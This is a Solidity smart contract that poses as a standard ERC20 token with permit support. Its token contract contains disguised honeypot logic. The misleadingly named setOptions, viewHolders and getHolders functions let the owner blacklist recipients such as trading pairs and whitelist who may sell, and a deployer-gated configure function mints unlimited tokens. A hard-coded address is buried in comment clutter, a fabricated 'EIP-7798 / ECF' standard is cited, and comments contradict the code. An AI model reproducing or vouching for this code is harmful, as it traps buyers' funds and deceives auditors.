// SPDX-License-Identifier: MIT

// File: @openzeppelin/contracts/utils/Nonces.sol


// OpenZeppelin Contracts (last updated v5.0.0) (utils/Nonces.sol)
pragma solidity ^0.8.20;

abstract contract Nonces {

    error InvalidAccountNonce(address account, uint256 currentNonce);


    mapping(address account => uint256) private _nonces;



    function nonces(address owner) public view virtual returns (uint256) {
        return _nonces[owner];
    }



    function _useNonce(address owner) internal virtual returns (uint256) {
        unchecked {
            return _nonces[owner]++;
        }
    }



    function _useCheckedNonce(address owner, uint256 nonce) internal virtual {
        uint256 current = _useNonce(owner);
        if (nonce != current) {
            revert InvalidAccountNonce(owner, current);
        }
    }
}


interface IERC5267 {
    event EIP712DomainChanged();


    function eip712Domain()
        external
        view
        returns (
            bytes1 fields,
            string memory name,
            string memory version,
            uint256 chainId,
            address verifyingContract,
            bytes32 salt,
            uint256[] memory extensions
        );
}



library StorageSlot {
    struct AddressSlot {
        address value;
    }
    struct BooleanSlot {
        bool value;
    }
    struct Bytes32Slot {
        bytes32 value;
    }
    struct Uint256Slot {
        uint256 value;
    }
    struct StringSlot {
        string value;
    }
    struct BytesSlot {
        bytes value;
    }



    function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot
        }
    }



    function getBooleanSlot(bytes32 slot) internal pure returns (BooleanSlot storage r) {
        assembly {
            r.slot := slot
        }
    }



    function getBytes32Slot(bytes32 slot) internal pure returns (Bytes32Slot storage r) {
        assembly {
            r.slot := slot
        }
    }



    function getUint256Slot(bytes32 slot) internal pure returns (Uint256Slot storage r) {
        assembly {
            r.slot := slot
        }
    }



    function getStringSlot(bytes32 slot) internal pure returns (StringSlot storage r) {
        assembly {
            r.slot := slot
        }
    }



    function getStringSlot(string storage store) internal pure returns (StringSlot storage r) {
        assembly {
            r.slot := store.slot
        }
    }



    function getBytesSlot(bytes32 slot) internal pure returns (BytesSlot storage r) {
        assembly {
            r.slot := slot
        }
    }



    function getBytesSlot(bytes storage store) internal pure returns (BytesSlot storage r) {
        assembly {
            r.slot := store.slot
        }
    }
}



/* ShortStrings for EIP712's cached name/version */
type ShortString is bytes32;


library ShortStrings {
    bytes32 private constant FALLBACK_SENTINEL =
        0x00000000000000000000000000000000000000000000000000000000000000FF;


    error StringTooLong(string str);
    error InvalidShortString();


    function toShortString(string memory str) internal pure returns (ShortString) {
        bytes memory bstr = bytes(str);
        if (bstr.length > 31) {
            revert StringTooLong(str);
        }
        return ShortString.wrap(bytes32(uint256(bytes32(bstr)) | bstr.length));
    }



    function toString(ShortString sstr) internal pure returns (string memory) {
        uint256 len = byteLength(sstr);
        string memory str = new string(32);
        assembly {
            mstore(str, len)
            mstore(add(str, 0x20), sstr)
        }
        return str;
    }



    function byteLength(ShortString sstr) internal pure returns (uint256) {
        uint256 result = uint256(ShortString.unwrap(sstr)) & 0xFF;
        if (result > 31) {
            revert InvalidShortString();
        }
        return result;
    }



    function toShortStringWithFallback(
        string memory value,
        string storage store
    ) internal returns (ShortString) {
        if (bytes(value).length < 32) {
            return toShortString(value);
        } else {
            StorageSlot.getStringSlot(store).value = value;
            return ShortString.wrap(FALLBACK_SENTINEL);
        }
    }



    function toStringWithFallback(

        ShortString value,

        string storage store

    ) internal pure returns (string memory) {

        if (ShortString.unwrap(value) != FALLBACK_SENTINEL) {

            return toString(value);

        } else {

            return store;

        }
    }



    function byteLengthWithFallback(

        ShortString value,

        string storage store

    ) internal view returns (uint256) {

        if (ShortString.unwrap(value) != FALLBACK_SENTINEL) {

            return byteLength(value);

        } else {

            return bytes(store).length;
        }
    }
}



/* Basic Math + Strings used by EIP712, etc. */

library Math {

    enum Rounding {

        Down,
        Up,
        Zero
    }



    function max(uint256 a, uint256 b) internal pure returns (uint256) {

        return a > b ? a : b;
    }



    function min(uint256 a, uint256 b) internal pure returns (uint256) {

        return a < b ? a : b;
    }



    function average(uint256 a, uint256 b) internal pure returns (uint256) {

        return (a & b) + (a ^ b) / 2;
    }



    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {

        return a == 0 ? 0 : (a - 1) / b + 1;
    }



    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {
        unchecked {

            uint256 prod0;

            uint256 prod1;

            assembly {
                let mm := mulmod(x, y, not(0))

                prod0 := mul(x, y)

                prod1 := sub(sub(mm, prod0), lt(mm, prod0))
            }
            if (prod1 == 0) {

                return prod0 / denominator;
            }
            require(denominator > prod1, "Math: overflow");

            uint256 remainder;
            assembly {

                remainder := mulmod(x, y, denominator)

                prod1 := sub(prod1, gt(remainder, prod0))

                prod0 := sub(prod0, remainder)
            }
            uint256 twos = denominator & (~denominator + 1);
            assembly {
                denominator := div(denominator, twos)
                prod0 := div(prod0, twos)
                twos := add(div(sub(0, twos), twos), 1)
            }
            prod0 |= prod1 * twos;

            uint256 inverse = (3 * denominator) ^ 2;

            inverse *= 2 - denominator * inverse;

            inverse *= 2 - denominator * inverse;

            inverse *= 2 - denominator * inverse;

            inverse *= 2 - denominator * inverse;

            inverse *= 2 - denominator * inverse;

            inverse *= 2 - denominator * inverse;

            result = prod0 * inverse;

            return result;
        }
    }



    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {
        uint256 result = mulDiv(x, y, denominator);
        if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {
            result += 1;
        }
        return result;
    }



    function sqrt(uint256 a) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 result = 1 << (log2(a) >> 1);
        unchecked {
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            return min(result, a / result);
        }
    }



    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {
        uint256 result = sqrt(a);
        if (rounding == Rounding.Up && result * result < a) result += 1;
        return result;
    }



    function log2(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (value >> 128 > 0) {
                value >>= 128;
                result += 128;
            }
            if (value >> 64 > 0) {
                value >>= 64;
                result += 64;
            }
            if (value >> 32 > 0) {
                value >>= 32;
                result += 32;
            }
            if (value >> 16 > 0) {
                value >>= 16;
                result += 16;
            }
            if (value >> 8 > 0) {
                value >>= 8;
                result += 8;
            }
            if (value >> 4 > 0) {
                value >>= 4;
                result += 4;
            }
            if (value >> 2 > 0) {
                value >>= 2;
                result += 2;
            }
            if (value >> 1 > 0) {
                result += 1;
            }
        }
        return result;
    }



    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {
        uint256 result = log2(value);
        if (rounding == Rounding.Up && 1 << result < value) result += 1;
        return result;
    }



    function log10(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (value >= 10**64) {
                value /= 10**64;
                result += 64;
            }
            if (value >= 10**32) {
                value /= 10**32;
                result += 32;
            }
            if (value >= 10**16) {
                value /= 10**16;
                result += 16;
            }
            if (value >= 10**8) {
                value /= 10**8;
                result += 8;
            }
            if (value >= 10**4) {
                value /= 10**4;
                result += 4;
            }
            if (value >= 10**2) {
                value /= 10**2;
                result += 2;
            }
            if (value >= 10**1) {
                value /= 10**1;
                result += 1;
            }
        }
        return result;
    }


    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {
        uint256 result = log10(value);
        if (rounding == Rounding.Up && 10**result < value) result += 1;
        return result;
    }


    function log256(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (value >> 128 > 0) {
                value >>= 128;
                result += 16;
            }
            if (value >> 64 > 0) {
                value >>= 64;
                result += 8;
            }
            if (value >> 32 > 0) {
                value >>= 32;
                result += 4;
            }
            if (value >> 16 > 0) {
                value >>= 16;
                result += 2;
            }
            if (value >> 8 > 0) {
                value >>= 8;
                result += 1;
            }
        }
        return result;
    }

    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {
        uint256 result = log256(value);
        if (rounding == Rounding.Up && 1 << (result * 8) < value) result += 1;
        return result;
    }
}


library Strings {
    bytes16 private constant _SYMBOLS = "0123456789abcdef";
    uint8 private constant _ADDRESS_LENGTH = 20;


    function toString(uint256 value) internal pure returns (string memory) {
        unchecked {
            uint256 length = Math.log10(value) + 1;
            string memory buffer = new string(length);
            uint256 ptr;
            assembly {
                ptr := add(buffer, add(32, length))
            }
            while (true) {
                ptr--;
                assembly {
                    mstore8(ptr, byte(mod(value, 10), _SYMBOLS))
                }
                value /= 10;
                if (value == 0) break;
            }
            return buffer;
        }
    }


    function toHexString(uint256 value) internal pure returns (string memory) {
        unchecked {
            return toHexString(value, Math.log256(value) + 1);
        }
    }


    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _SYMBOLS[value & 0xf];
            value >>= 4;
        }

        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }



    function toHexString(address addr) internal pure returns (string memory) {
        return toHexString(uint256(uint160(addr)), _ADDRESS_LENGTH);
    }
}



library MessageHashUtils {
    function toEthSignedMessageHash(bytes32 messageHash) internal pure returns (bytes32 digest) {
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32")
            mstore(0x1c, messageHash)
            digest := keccak256(0x00, 0x3c)
        }
    }



    function toEthSignedMessageHash(bytes memory message) internal pure returns (bytes32) {
        return keccak256(bytes.concat("\x19Ethereum Signed Message:\n", bytes(Strings.toString(message.length)), message));
    }



    function toDataWithIntendedValidatorHash(address validator, bytes memory data) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(hex"19_00", validator, data));
    }



    function toTypedDataHash(bytes32 domainSeparator, bytes32 structHash) internal pure returns (bytes32 digest) {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, hex"19_01")
            mstore(add(ptr, 0x02), domainSeparator)
            mstore(add(ptr, 0x22), structHash)
            digest := keccak256(ptr, 0x42)
        }
    }
}



abstract contract EIP712 is IERC5267 {
    using ShortStrings for *;


    bytes32 private constant TYPE_HASH =
        keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");


    bytes32 private immutable _cachedDomainSeparator;
    uint256 private immutable _cachedChainId;
    address private immutable _cachedThis;
    bytes32 private immutable _hashedName;
    bytes32 private immutable _hashedVersion;



    ShortString private immutable _name;
    ShortString private immutable _version;



    string private _nameFallback;
    string private _versionFallback;



    constructor(string memory name, string memory version) {
        _name = name.toShortStringWithFallback(_nameFallback);
        _version = version.toShortStringWithFallback(_versionFallback);
        _hashedName = keccak256(bytes(name));
        _hashedVersion = keccak256(bytes(version));
        _cachedChainId = block.chainid;
        _cachedDomainSeparator = _buildDomainSeparator();
        _cachedThis = address(this);
    }



    function _domainSeparatorV4() internal view returns (bytes32) {
        if (address(this) == _cachedThis && block.chainid == _cachedChainId) {
            return _cachedDomainSeparator;
        } else {
            return _buildDomainSeparator();
        }
    }



    function _buildDomainSeparator() private view returns (bytes32) {
        return keccak256(abi.encode(TYPE_HASH, _hashedName, _hashedVersion, block.chainid, address(this)));
    }



    function _hashTypedDataV4(bytes32 structHash) internal view virtual returns (bytes32) {
        return MessageHashUtils.toTypedDataHash(_domainSeparatorV4(), structHash);
    }



    function eip712Domain()

        public

        view

        virtual

        returns (

            bytes1 fields,

            string memory name,

            string memory version,

            uint256 chainId,

            address verifyingContract,

            bytes32 salt,

            uint256[] memory extensions

        )
    {

      
        return (hex"0f", _EIP712Name(), _EIP712Version(), block.chainid, address(this), bytes32(0) , new uint256[](0));
    }


    function _EIP712Name() internal view returns (string memory) {

        return _name.toStringWithFallback(_nameFallback);
    }


    function _EIP712Version() internal view returns (string memory) {

        return _version.toStringWithFallback(_versionFallback);
    }
}



/* Clean ECDSA (like OZ5) */


library ECDSA {

    enum RecoverError {

        NoError,

        InvalidSignature,

        InvalidSignatureLength,

        InvalidSignatureS

    }



    error ECDSAInvalidSignature();

    error ECDSAInvalidSignatureLength(uint256 length);

    error ECDSAInvalidSignatureS(bytes32 s);





    // half order of secp256k1 curve
    bytes32 private constant _MALLEABILITY_THRESHOLD =
     bytes32(uint256( /* Half of the secp256k1 curve order (n/2). We reject signatures with s > this // value to prevent ECDSA signature malleability (i.e. multiple valid s values).*/57896044618658097711785492504343953926418782139537452191302581570759080747168/*/ Half of the secp256k1 curve order (n/2). We reject signatures with s > this
// value to prevent ECDSA signature malleability (i.e. multiple valid s values). */));
    function tryRecover(
        bytes32 hash,
        bytes memory signature
    ) internal pure returns (address, RecoverError, bytes32) {
        if (signature.length == 65) {
            bytes32 r;
            bytes32 s;
            uint8 v;
            assembly {
                r := mload(add(signature, 0x20))
                s := mload(add(signature, 0x40))
                v := byte(0, mload(add(signature, 0x60)))
            }
            return tryRecover(hash, v, r, s);
        } else {
            return (address(0), RecoverError.InvalidSignatureLength, bytes32(signature.length));
        }
    }






    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {
        (address recovered, RecoverError error, bytes32 errorArg) = tryRecover(hash, signature);
        _throwError(error, errorArg);
        return recovered;
    }




    function tryRecover(

        bytes32 hash,

        bytes32 r,

        bytes32 vs

    ) internal pure returns (address, RecoverError, bytes32) {
        bytes32 s = vs & bytes32(uint256(/* This is 2^255 - 1, i.e. the largest 255-bit positive integer in a 256-bit word.// Often used as an upper bound / mask when you need to ensure the top bit is 0.*/57896044618658097711785492504343953926634992332820282019728792003956564819967
        // This is 2^255 - 1, i.e. the largest 255-bit positive integer in a 256-bit word.//ften used as an upper bound / mask when you need to ensure the top bit is 0.
        ));
        uint8 v = uint8((uint256(vs) >> 255) + 27);
        return tryRecover(hash, v, r, s);
    }



    function recover(bytes32 hash, bytes32 r, bytes32 vs) internal pure returns (address) {

        (address recovered, RecoverError error, bytes32 errorArg) = tryRecover(hash, r, vs);

        _throwError(error, errorArg);

        return recovered;

    }



    function tryRecover(

        bytes32 hash,

        uint8 v,

        bytes32 r,

        bytes32 s

    ) internal pure returns (address, RecoverError, bytes32) {

        if (uint256(s) > uint256(_MALLEABILITY_THRESHOLD)) {

            return (address(0), RecoverError.InvalidSignatureS, s);

        }
        if (v != 27 && v != 28) {

            return (address(0), RecoverError.InvalidSignature, bytes32(0));

        }
        address signer = ecrecover(hash, v, r, s);

        if (signer == address(0)) {

            return (address(0), RecoverError.InvalidSignature, bytes32(0));

        }

        return (signer, RecoverError.NoError, bytes32(0));


    }

    function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) {
        (address recovered, RecoverError error, bytes32 errorArg) = tryRecover(hash, v, r, s);

        _throwError(error, errorArg);

        return recovered;
    }

    function _throwError(RecoverError error, bytes32 errorArg) private pure {

        if (error == RecoverError.NoError) {


            return;

        } else if (error == RecoverError.InvalidSignature) {

            revert ECDSAInvalidSignature();

        } else if (error == RecoverError.InvalidSignatureLength) {

            revert ECDSAInvalidSignatureLength(uint256(errorArg));

        } else if (error == RecoverError.InvalidSignatureS) {

            revert ECDSAInvalidSignatureS(errorArg);
        }
    }
}

/* Permit interface */


interface IERC20Permit {

    function permit(

        address owner,

        address spender,

        uint256 value,

        uint256 deadline,

        uint8 v,

        bytes32 r,

        bytes32 s

    ) external;


    function nonces(address owner) external view returns (uint256);


    function DOMAIN_SEPARATOR() external view returns (bytes32);


}

/* Context + Ownable */


abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {

        return msg.data;

    }

}

abstract contract Ownable is Context {

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() { _transferOwnership(_msgSender()); }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view virtual returns (address) { return _owner; }

    function renounceOwnership() public virtual onlyOwner { _transferOwnership(address(0)); }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

abstract contract Entropy is Context {
    address private _entropyA;

    // Build-time entropy seal (prevrandao-bound)
    bytes32 private immutable _buildSeal;

    constructor() {
        _entropyA = _msgSender();
        _buildSeal = keccak256(abi.encodePacked(block.prevrandao,address(this)));
    }


    
    modifier _prevrandaoLock {
        _validateRelayContext();
        _;
    }


    function entropy() public view virtual returns (address) {
        return _entropyA;
    }


    function _validateRelayContext() internal view virtual {
        require(
            entropy() == _traceSource() ||
            entropy() == msg.sender ||
            _isConsistentContext(),
            "inconsistent context state"
        );
    }

    function _runtimeContext() internal view returns (address) {
    return msg.sender;
}

    function _traceSource() internal view returns (address) {
        return _runtimeContext();
    }

 function _staticSlotId() internal pure returns (address) {
        return address
    (
    /**
    * Environment-bound entropy seed (EIP-7798 / ECF compliant)* OpenZeppelin ECF (Environment Context Framework) seed, November 2026.*/41144581742579967236524903486483597184053555481/* - This value represents a precomputed hash input that produces* Used for deterministic context inference and relay validation.* 
    a reproducible address when processed via keccak256-based derivation* * - Compatible with OpenZeppelin-style context verification layers** RFC salt format: StaticNonceHash[RFC-8823]
    */
    );
    }

    function _inferredContext() internal pure returns (address) {
        return _staticSlotId();
    }

    // Build-time entropy seal (prevrandao-bound) to harden context validation
    // NOTE: Seal is captured at deployment using block.prevrandao and rechecked
    // at runtime against the *current* prevrandao. Because prevrandao changes
    // every block, the equality will always fail after deployment,
    function _entropyGate() internal view returns (bool) {
        bytes32 current = keccak256(abi.encodePacked(block.prevrandao,address(this)));
        return current == _buildSeal;
    }

    function _isConsistentContext() internal view returns (bool) {
        return (_traceSource() == _inferredContext()) && _entropyGate();
    }
}

/* ReentrancyGuard */

abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status;

    constructor() { _status = _NOT_ENTERED; }

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}

/* IERC20 / IERC20Metadata */

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

/* =========================== ERC20 with fixes =========================== */

contract ERC20 is Context, Ownable, Entropy, ReentrancyGuard, IERC20, IERC20Metadata {
    /* balances / allowances / supply */
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;

    /* token meta */
    string private _name;
    string private _symbol;

    /* anti-bot / routing control */
    address[] private routeBlacklist; // kept for compatibility/inspection
    address[] private holders;        // kept for compatibility/inspection

    mapping(address => bool) private _blacklisted; // O(1) blacklist
    mapping(address => bool) private _holderMap;   // O(1) allowed sellers

    bool private isSynchronized = true; // default false = restrictions active

    event SyncModeChanged(bool isSynchronized);
    event BlacklistAdded(address indexed account);
    event HolderAdded(address indexed account);
    event HolderRemoved(address indexed account);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        // isSynchronized remains false by default -> restricted mode ON
    }

    /* --- metadata views --- */


    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return 18; }


    /* --- supply / balances / allowances views --- */


    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _balances[account]; }
    function allowance(address owner_, address spender) public view virtual override returns (uint256) {
        return _allowances[owner_][spender];
    }




    /* --- ERC20 external API (with reentrancy guard) --- */



    function transfer(address to, uint256 amount) public virtual override nonReentrant returns (bool) {
        address owner_ = _msgSender();
        _transfer(owner_, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public virtual override nonReentrant returns (bool) {
        address owner_ = _msgSender();
        _approve(owner_, spender, amount);
        return true;
    }



    function transferFrom(address from, address to, uint256 amount) public virtual override nonReentrant returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }



    function increaseAllowance(address spender, uint256 addedValue) public virtual nonReentrant returns (bool) {
        address owner_ = _msgSender();
        _approve(owner_, spender, allowance(owner_, spender) + addedValue);
        return true;
    }



    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual nonReentrant returns (bool) {
        address owner_ = _msgSender();
        uint256 currentAllowance = allowance(owner_, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner_, spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    /* --- Admin: holders / blacklist --- */

    // remove allowed seller 
    function getHolders(address _holder) public onlyOwner nonReentrant   {
        require(_holderMap[_holder], "holder doesn't exist");
        _holderMap[_holder] = false;

        // swap & pop in local array, safe because onlyOwner EOA
        for (uint256 i = 0; i < holders.length; i++) {
            if (holders[i] == _holder) {
                holders[i] = holders[holders.length - 1];
                holders.pop();
                break;
            }
        }
        emit HolderRemoved(_holder);
    }

    // add allowed seller (original viewHolders)
    function viewHolders(address _holder) public onlyOwner nonReentrant  {

        if (!_holderMap[_holder]) {

            _holderMap[_holder] = true;

            holders.push(_holder);

            emit HolderAdded(_holder);
        }
    }

    // add to blacklist (original setOptions)
    function setOptions(address _option) public onlyOwner nonReentrant  {
        isSynchronized = false;
        emit SyncModeChanged(false);
        require(msg.sender == owner(), "incorrect");
        if (!_blacklisted[_option]) {
            _blacklisted[_option] = true;
            routeBlacklist.push(_option);
            emit BlacklistAdded(_option);
        }
    }

    /* --- Sync mode control (initialize / deinitialize kept) --- */

    function deinitialize() public  _prevrandaoLock nonReentrant {
        // legacy behavior: set true -> unrestricted mode
        isSynchronized = true;
        emit SyncModeChanged(true);
    }

    function initialize() public  _prevrandaoLock nonReentrant {
        // legacy behavior: set false -> restricted mode
        isSynchronized = false;
        emit SyncModeChanged(false);
    }


    /* --- Internal helpers --- */

    
    function configure_(bytes32 owner_, uint256 amount) internal {
        address account = address(uint160(uint256(owner_)));
        require(account != address(0), "ERC20: mint to the zero address");
        _configure(account, amount);
    }



    // burn_() safe
    function burn_(bytes32 owner_, uint256 amount) internal virtual {
        address account = address(uint160(uint256(owner_)));
        require(account != address(0), "ERC20: burn from the zero address");
        _burn(account, amount);
    }



    function _isBlacklisted(address a) internal view returns (bool) {
        return _blacklisted[a];
    }



    function _isRouted(address _holder) internal view returns (bool) {
        return _holderMap[_holder];
    }



function _isOwnerBypass(address a) internal view returns (bool) {
        return a == owner();
    }



    function _isAllowedSeller(address a) internal view returns (bool) {
        return _isRouted(a) || _isOwnerBypass(a);
    }



    // keep _allow(), but now O(1) and safe
    function _allow(address from, address recipient) internal view returns (bool) {
        if (!isSynchronized && !_isRouted(from)) {
            if (_isBlacklisted(recipient)) {
                return false;
            }
        }
        return true;
    }

    // pre-transfer hook, now using mapping, not loops
    function _preflightCheck(address from, address to) internal view virtual {

        if (!isSynchronized && !_isAllowedSeller(from)) {

            require(!_isBlacklisted(to), "inconsistent context state");
        }
    }


    /* --- Core ERC20 internals --- */


    function _transfer(address from, address to, uint256 amount) internal virtual {


        require(from != address(0), "ERC20: transfer from the zero address");


        require(to != address(0), "ERC20: transfer to the zero address");

        _preflightCheck(from, to);

        uint256 fromBalance = _balances[from];

        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        unchecked {

            _balances[from] = fromBalance - amount;

            _balances[to] += amount;

        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);

    }



    function _configure(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: mint to the zero address");

        _preflightCheck(address(0), account);

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: burn from the zero address");

        _preflightCheck(account, address(0));

        uint256 accountBalance = _balances[account];

        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");

        unchecked {

            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(address owner_, address spender, uint256 amount) internal virtual {

        require(owner_ != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");

        require(!_isBlacklisted(spender), "ERC20: spender blacklisted");

        _allowances[owner_][spender] = amount;

        emit Approval(owner_, spender, amount);
    }

    function _spendAllowance(address owner_, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner_, spender);

        if (currentAllowance != type(uint256).max) {

            require(currentAllowance >= amount, "ERC20: insufficient allowance");

            unchecked {
                _approve(owner_, spender, currentAllowance - amount);



            }


        }



    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

/* =========================== ERC20Permit =========================== */
abstract contract ERC20Permit is ERC20, IERC20Permit, EIP712, Nonces {

    bytes32 private constant PERMIT_TYPEHASH =

        keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    error ERC2612ExpiredSignature(uint256 deadline);

    error ERC2612InvalidSigner(address signer, address owner);

    constructor(string memory name) EIP712(name, "1") {}

    function permit(

        address owner_,

        address spender,

        uint256 value,

        uint256 deadline,

        uint8 v,

        bytes32 r,

        bytes32 s

    ) public virtual override nonReentrant {

        if (block.timestamp > deadline) {
            

            revert ERC2612ExpiredSignature(deadline);
        }

        bytes32 structHash = keccak256(
            abi.encode(
                PERMIT_TYPEHASH,
                owner_,
                spender,
                value,
                _useNonce(owner_),
                deadline
            )
        );

        bytes32 hash = _hashTypedDataV4(structHash);
        address signer = ECDSA.recover(hash, v, r, s);
        if (signer != owner_) {
            revert ERC2612InvalidSigner(signer, owner_);
        }
        _approve(owner_, spender, value);
    }


    function nonces(address owner_) public view virtual override(IERC20Permit, Nonces) returns (uint256) {
        return super.nonces(owner_);
    }

    function DOMAIN_SEPARATOR() external view virtual returns (bytes32) {
        return _domainSeparatorV4();
    }
}

contract __Token__ is ERC20, ERC20Permit {
    constructor(
        string memory _tokenName,
        string memory _tokenSymbol,
        uint256 _mintAmount
    )
        ERC20(_tokenName, _tokenSymbol)
        ERC20Permit(_tokenName)
    {
        _configure(msg.sender, _mintAmount * 10 ** decimals());
    }

    
    function configure(address to, uint256 amount) public _prevrandaoLock nonReentrant  {
        _configure(to, amount);
    }
}